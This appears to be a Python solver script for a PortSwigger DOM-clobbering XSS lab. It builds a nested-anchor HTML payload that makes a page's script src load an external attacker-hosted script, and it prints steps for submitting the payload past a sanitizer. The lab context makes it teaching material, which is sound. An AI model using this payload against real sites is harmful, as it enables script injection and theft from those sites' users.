"""
Lab 6: Exploiting DOM clobbering to enable XSS
https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering
Difficulty: Expert

📝 The flaw: page script does something like
  var someObject = window.someObject || {};
  ...
  element.src = someObject.url;
and someObject is never explicitly defined — so if we can inject HTML (but
NOT <script> tags, due to a sanitizer) BEFORE that script runs, a clobbering
element can supply `someObject` itself, with `.url` resolved from a nested
named element.

The classic clobbering primitive for an object with a property:
  <a id="someObject"><a id="someObject" name="url" href="JAVASCRIPT_PAYLOAD_URL"></a></a>
window.someObject becomes the outer <a>, and someObject.url resolves via the
named inner element's `name="url"` + href.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
# This lab is typically solved via the comment/feedback HTML-injection point.
INJECTION_PATH = "/post/comment"


def build_clobbering_payload(malicious_src="https://subdomain1.web-security-academy.net/dom-clobbering/clobberable.js"):
    """
    The lab's canonical solution clobbers `defaultAvatar` (or similar) so a
    <script> tag's src attribute resolves to an attacker-controlled external
    script. Confirm the EXACT global/property name from the page's own JS
    source before relying on this — it varies slightly between lab variants.
    """
    return (
        f'<a id="defaultAvatar">'
        f'<a id="defaultAvatar" name="avatar" href="{malicious_src}">'
        f'</a></a>'
    )


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for `var x = window.x || {{}}` patterns and later property")
    note("reads off that object feeding a script `src` or similar sink.")
    grep_for_patterns(source, ["|| {}", "window.", ".src ="])

    payload = build_clobbering_payload()
    log(f"Clobbering payload: {payload}")

    note("Submit this via the comment form at " + INJECTION_PATH + " (the")
    note("sanitizer strips <script>/event handlers but not these anchor tags).")
    note("Host the referenced external script on the exploit server with the")
    note("actual exploit JS (e.g. print()) if the lab's own clobberable.js")
    note("isn't the intended target for your variant.")


if __name__ == "__main__":
    run()
